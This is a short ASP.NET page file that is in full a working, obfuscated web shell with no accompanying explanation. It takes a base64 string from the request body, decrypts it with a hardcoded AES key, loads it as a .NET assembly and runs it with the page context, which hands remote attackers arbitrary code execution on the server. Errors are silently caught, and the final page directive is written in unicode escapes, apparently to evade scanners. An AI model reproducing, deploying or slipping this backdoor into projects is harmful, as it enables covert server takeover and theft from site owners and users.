<%@ Import Namespace="System.IO"%>
<%
    try {
        string key = "900bc885d7553375";
        byte[] k = Encoding.Default.GetBytes(key);
        Session.Add("sky", key);
        StreamReader sr = new StreamReader(Request.InputStream);
        string line = sr.ReadLine();
        if (!string.IsNullOrEmpty(line))
        {
            byte[] c = Convert.FromBase64String(line);
            Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("U").Equals(this.Context);
            sr.Close();
        }
    }
    catch{ }

%>%><%\u0000%><%\u0020\u0050\u0061\u0067\u0065\u0020\u004c\u0061\u006e\u0067\u0075\u0061\u0067\u0065\u003d\u0022\u0043\u0023\u0022\u0020%>